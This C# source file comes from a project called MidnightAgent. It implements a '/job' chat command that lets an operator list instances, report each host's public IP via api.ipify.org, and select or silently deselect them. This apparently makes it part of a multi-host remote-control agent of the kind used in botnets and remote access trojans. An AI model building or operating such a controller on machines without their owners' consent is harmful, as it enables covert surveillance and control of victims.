using System;
using System.Threading.Tasks;
using MidnightAgent.Core;

namespace MidnightAgent.Features
{
    public class JobFeature : IFeature
    {
        public string Command => "job";
        public string Description => "Select target agent(s) (Usage: /job [id] or /job all)";
        public string Usage => "/job <id>";

        public Task<FeatureResult> ExecuteAsync(string[] args)
        {
            // Case 1: No args -> Report ID & Status
            if (args.Length == 0)
            {
                string status = AgentState.IsActiveTarget ? "✅ ACTIVE" : "zzz STANDBY";
                string nick = NickFeature.GetNickname();
                string display = string.IsNullOrEmpty(nick) ? AgentState.InstanceId : $"{AgentState.InstanceId} ({nick})";

                string msg = $"🆔 <b>Agent Identity</b>\n\n" +
                             $"ID: <code>{display}</code>\n" +
                             $"Ver: {Config.FullVersion}\n" +
                             $"Status: {status}\n\n" +
                             $"To select me: <code>/job {AgentState.InstanceId}</code>";
                return Task.FromResult(FeatureResult.Ok(msg));
            }

            string targetId = args[0];

            // Case 2: Check-in / List
            if (targetId.Equals("list", StringComparison.OrdinalIgnoreCase) || 
                targetId.Equals("status", StringComparison.OrdinalIgnoreCase))
            {
                string ip = "Unknown";
                try 
                { 
                    using (var client = new System.Net.WebClient()) 
                        ip = client.DownloadString("https://api.ipify.org"); 
                } catch {}
                
                string activeIcon = AgentState.IsActiveTarget ? "✅" : "zzz";
                string nick = NickFeature.GetNickname();
                string display = string.IsNullOrEmpty(nick) ? AgentState.InstanceId : $"{AgentState.InstanceId} ({nick})";
                
                return Task.FromResult(FeatureResult.Ok($"{activeIcon} <b>{display}</b>\nv{Config.FullVersion}\n🌐 {ip}"));
            }

            // Case 3: Selection Logic
            if (targetId.Equals("all", StringComparison.OrdinalIgnoreCase) || 
                targetId.Equals(AgentState.InstanceId, StringComparison.OrdinalIgnoreCase))
            {
                AgentState.IsActiveTarget = true;
                return Task.FromResult(FeatureResult.Ok($"✅ <b>Agent Activated</b>\n🆔 {AgentState.InstanceId} is now listening."));
            }
            else
            {
                // Deselect self
                AgentState.IsActiveTarget = false;
                // Silent fail (don't reply)
                return Task.FromResult(FeatureResult.Fail(null)); 
            }
        }
    }
}
